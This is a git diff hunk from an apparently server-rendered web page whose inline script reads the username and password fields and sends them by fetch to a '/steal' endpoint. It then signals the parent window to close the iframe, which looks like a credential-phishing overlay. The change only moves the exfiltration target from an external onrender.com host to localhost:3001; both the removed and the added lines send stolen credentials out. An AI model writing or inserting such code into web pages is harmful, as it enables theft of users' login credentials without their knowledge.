@@ -214,7 +214,7 @@ res.send(`
       var username = document.getElementById('username').value;
       var password = document.getElementById('password').value;
       if (username && password) {
-        fetch('https://python-test-server-d3hl.onrender.com/steal?username=' + encodeURIComponent(username) + '&password=' + encodeURIComponent(password), { mode: 'no-cors' });
+        fetch('localhost:3001/steal?username=' + encodeURIComponent(username) + '&password=' + encodeURIComponent(password), { mode: 'no-cors' });
         // Signal the parent window to close the iframe
         window.parent.postMessage('close-iframe', '*');
       }
